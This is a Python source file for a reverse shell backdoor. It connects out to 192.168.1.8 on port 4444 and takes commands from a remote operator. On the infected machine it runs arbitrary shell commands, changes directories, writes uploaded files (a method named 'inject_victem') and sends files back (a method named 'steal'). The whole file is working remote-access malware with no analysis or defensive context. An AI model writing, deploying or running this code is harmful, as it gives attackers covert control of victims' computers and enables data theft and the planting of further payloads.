import socket
import subprocess as sub
import os
import base64 as code


def list_to_str(list):
    new_str = ""
    for element in list:
        new_str = new_str + element + ' '
    return new_str

class Connection:
    def __init__(self):
        self.count = 0

    def start(self):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect(("192.168.1.8", 4444))

    def send(self, data):
        self.connection.send(data)

    def send_UTF(self, data):
        self.send(data.encode("UTF-8"))

    def recv(self):
        data = ""
        buffer = 1024
        while True:
            part = self.connection.recv(buffer).decode("UTF-8")
            data += part
            if len(part) < buffer:
                break
        return data

    def close(self):
        self.connection.close()

    def excute(self, data):
        return sub.check_output(data, shell=True)

    def chdir(self, data):
        os.chdir(data)
        return "chdir"

    def inject_victem(self, path, data):
        with open(path, "wb") as file:
            file.write(code.b64decode(data))

    def steal(self, path):
        with open(path, "rb") as file:
            return code.b64encode(file.read())

#<<<<<<<<<<<<<<<<<<<<<<<< Running >>>>>>>>>>>>>>>>>>>>>>>>>>#

target = Connection()
target.start()
while True:
    try:
        command = target.recv().split(' ')
        command = command[:-1]
        if command[0] == "exit":
            target.close()
            exit()
            break
        elif command[0] == "cd" and len(command) > 1:
            target.chdir(command[1])
            target.send_UTF("chdir")
        elif command[0] == "upload":
            while True:
                target.send_UTF("OK")
                data        = target.recv()
                target.send_UTF("OK")
                length      = int(target.recv())
                real_length = len(data)
                if real_length == length:
                    target.inject_victem(command[1], data)
                    target.send_UTF("[+] upload Successfully.")
                else:
                    target.send_UTF("NO")
                    continue
                break
        elif command[0] == "download":
            target.send_UTF("OK")
            path     = target.recv()
            target.send_UTF("OK")
            len_msg  = target.recv()
            data     = target.steal(path)
            length   = len(data)
            target.send_UTF(str(length))
            get_data = target.recv()
            while True:
                if len(data) > 1025:
                    part = data[:1024]
                    data = data[1024:]
                    target.send(part)
                    ack = target.recv()
                else:
                    target.send(data)
                    break
            continue
        else:
            excuted_data = target.excute(list_to_str(command))
            target.send(excuted_data)
    except KeyboardInterrupt:
        target.start()
        exit()